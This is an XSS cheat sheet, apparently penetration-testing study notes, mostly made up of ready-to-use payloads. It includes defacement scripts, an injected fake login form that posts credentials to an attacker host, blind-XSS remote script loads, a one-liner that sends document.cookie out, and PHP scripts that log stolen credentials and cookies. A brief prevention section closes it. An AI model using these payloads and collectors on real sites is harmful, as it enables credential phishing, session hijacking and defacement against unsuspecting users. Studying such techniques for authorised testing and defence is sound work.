# XSS — Cross-Site Scripting

Executes JavaScript in the victim's browser. No direct server impact — client-side only. Scoped to same domain and browser JS engine. Limited to browser sandbox unless chained with browser vuln.

Types: Stored (persistent, DB-backed, affects all visitors) → Reflected (non-persistent, backend echoes input, URL-delivered) → DOM (client-side only, never hits backend, URL hash param).

PayloadsAllTheThings XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection Payload-Box: https://github.com/payloadbox/xss-payload-list

---

## Detection & Discovery

Basic test payload — triggers alert with current origin:

```html
<script>alert(window.origin)</script>
```

Alternatives if `alert()` is blocked:

```html
<plaintext>
<script>print()</script>
```

Stored = alert fires on refresh and for all users. Reflected = fires once, gone on refresh.

Reflected XSS delivered via URL — check Network tab for GET request, copy URL with payload:

```
http://<TARGET>/index.php?task=<script>alert(window.origin)</script>
```

DOM XSS: no HTTP request in Network tab, input goes into URL hash (`#task=`). View rendered source with `CTRL+SHIFT+C` (Inspector), not page source (`CTRL+U`).

DOM Source = where JS reads user input (`document.URL`, URL params). DOM Sink = where it writes to page (`innerHTML`, `document.write()`, `outerHTML`, jQuery `add/after/append`). Sink without sanitization = vulnerable.

DOM XSS payload — works where `<script>` is blocked by `innerHTML`:

```html
<img src="" onerror=alert(window.origin)>
```

---

## Automated Discovery

XSStrike (best open-source option):

```bash
git clone https://github.com/s0md3v/XSStrike.git
pip install -r requirements.txt
python xsstrike.py -u "http://<TARGET>/index.php?task=test"
```

Others: Brute XSS, XSSer. Always manually verify automated findings.

---

## Defacing (Stored XSS)

Change background:

```html
<script>document.body.style.background = "#141d2b"</script>
```

Change page title:

```html
<script>document.title = 'Hacked'</script>
```

Replace entire body HTML:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'</script>
```

---

## Phishing — Fake Login Form (Reflected XSS)

Inject a login form that POSTs creds to your server. Minify HTML into one line, use `document.write()`. Remove the original form element after injection to look legitimate. Comment out leftover HTML.

Full payload structure:

```html
<script>document.write('<h3>Please login to continue</h3><form action=http://<LHOST>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('<FORM_ID>').remove();</script><!--
```

Find the form element ID with `CTRL+SHIFT+C` → click the element → note `id=` attribute.

Catch creds with netcat (quick):

```bash
sudo nc -lvnp 80
```

Or PHP server that logs and redirects back (cleaner, victim doesn't see error):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET>/index.php");
    fclose($file);
    exit();
}
?>
```

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# write index.php above
sudo php -S 0.0.0.0:80
```

---

## Session Hijacking — Cookie Stealing

Use when XSS is blind (fires on admin panel you can't see). Inject a remote script load — name the script after the form field to identify which field fired:

```html
<script src=http://<LHOST>/fullname></script>
<script src=http://<LHOST>/username></script>
```

Other blind XSS payload variants (try all — which format the field uses matters):

```html
'><script src=http://<LHOST></script>
"><script src=http://<LHOST></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://<LHOST>\';document.body.appendChild(a)')
<script>$.getScript("http://<LHOST>")</script>
```

Start PHP listener first:

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Once you find which field fires (you'll see a request for `/fieldname`), serve this as `script.js`:

```javascript
new Image().src='http://<LHOST>/index.php?c='+document.cookie
```

PHP script to log cookies (save as `index.php` in your server dir):

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Use the stolen cookie: Firefox → `Shift+F9` → Storage → `+` → add cookie name+value → refresh.

> [!tip] For blind XSS, email fields usually validate format client+server-side (skip them). Password fields are hashed (skip them). Focus on name, username, website, support ticket text fields.

---

## Prevention — for Reporting

Front-end: input validation (regex), DOMPurify sanitization, avoid `innerHTML`/`document.write()`/`outerHTML` and jQuery `html()`/`append()`/`after()` with raw user input.

Back-end: PHP `htmlspecialchars()` / `htmlentities()` for output encoding, `addslashes()` for sanitization, `filter_var()` for validation. NodeJS: DOMPurify or `html-entities`.

Server config: `HttpOnly` + `Secure` cookie flags (blocks JS cookie access), `Content-Security-Policy: script-src 'self'`, `X-Content-Type-Options: nosniff`, WAF (ModSecurity).